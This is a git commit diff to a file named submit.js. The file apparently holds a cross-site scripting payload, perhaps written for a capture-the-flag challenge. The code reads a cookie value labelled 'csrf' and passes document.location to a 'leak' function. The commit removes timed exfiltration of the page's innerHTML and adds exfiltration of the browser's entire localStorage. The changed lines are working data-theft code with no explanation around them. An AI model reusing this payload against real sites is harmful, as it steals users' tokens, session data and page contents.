aeac86142d65b6dc15d16b432bb550be1efccf9a
Peter af Geijerstam <peter.af.geijerstam@gmail.com>
2020-01-21 18:57:01 +0100

    Update submit.js

--- submit.js
+++ submit.js
@@ -32,9 +32,5 @@ get = function(url)
 
 var csrf = document.cookie.split('=')[1];
 leak("location",JSON.stringify(document.location));
-leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML)));
-setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 1000);
-setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 1500);
-setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 2000);
-setTimeout(function(){ leak("innerhtml",unescape(encodeURIComponent(document.body.innerHTML))); }, 3000);
+leak("localstorage", JSON.stringify(localStorage));
 
